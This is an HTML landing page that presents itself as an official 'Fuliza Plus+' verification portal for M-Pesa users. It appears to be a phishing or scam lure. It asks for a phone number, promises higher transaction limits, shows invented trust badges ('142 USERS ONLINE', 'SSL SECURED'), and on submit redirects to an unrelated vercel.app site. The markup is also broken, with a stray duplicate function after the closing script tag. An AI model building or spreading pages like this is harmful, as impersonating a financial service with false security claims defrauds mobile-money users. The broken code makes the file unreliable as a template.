<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Fuliza Plus+</title>

<!-- FONT -->
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Poppins', sans-serif;
}

body {
  background: linear-gradient(to bottom, #f5f7fa, #e4e7eb);
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}

/* CARD */
.card {
  background: #fff;
  padding: 30px 20px;
  border-radius: 20px;
  width: 90%;
  max-width: 360px;
  text-align: center;
  box-shadow: 0 20px 40px rgba(0,0,0,0.08);
}

/* ICON */
.icon {
  width: 90px;
  height: 90px;
  margin: auto;
  margin-bottom: 15px;
  border-radius: 50%;
  background: #e6f4ea;
  display: flex;
  align-items: center;
  justify-content: center;
}

.icon img {
  width: 40px;
}

/* TITLE */
h1 {
  font-size: 22px;
  color: #111;
}

.sub {
  font-size: 12px;
  color: #16a34a;
  margin-top: 5px;
  font-weight: 600;
}

/* TEXT */
.desc {
  font-size: 14px;
  color: #6b7280;
  margin: 15px 0 20px;
}

/* INPUT */
.input-box {
  display: flex;
  align-items: center;
  background: #f3f4f6;
  border-radius: 12px;
  padding: 12px;
  margin-bottom: 15px;
}

.input-box span {
  margin-right: 8px;
  color: #9ca3af;
}

.input-box input {
  border: none;
  outline: none;
  background: transparent;
  width: 100%;
  font-size: 14px;
}

/* BUTTON */
button {
  width: 100%;
  padding: 14px;
  background: #16a34a;
  color: white;
  border: none;
  border-radius: 12px;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 6px;
}

button:hover {
  background: #15803d;
}

/* FOOTER */
.footer {
  margin-top: 15px;
  font-size: 12px;
  color: #9ca3af;
}
</style>
</head>

<body>

<div class="card">

  <div class="icon">
    <img src="https://cdn-icons-png.flaticon.com/512/1077/1077114.png">
  </div>

  <h1>Fuliza Plus+</h1>
  <div class="sub">OFFICIAL VERIFICATION PORTAL</div>

  <div class="desc">
    Verify your identity to unlock higher daily transaction limits.
  </div>

  <form onsubmit="submitForm(event)">

    <div class="input-box">
      <span>📱</span>
      <input type="text" placeholder="Enter M-Pesa Number" required>
    </div>

    <button type="submit">
      Check My Eligibility >
    </button>

  </form>

  <div class="footer">
    ● 142 USERS ONLINE &nbsp; | &nbsp; 🔒 SSL SECURED
  </div>

</div>

<script>
function submitForm(e){
  e.preventDefault();
  window.location.href = "https://hass-fuliza-boost.vercel.app";
}
</script>
function submitForm(e){
  e.preventDefault();
}
</script>

</body>
</html>
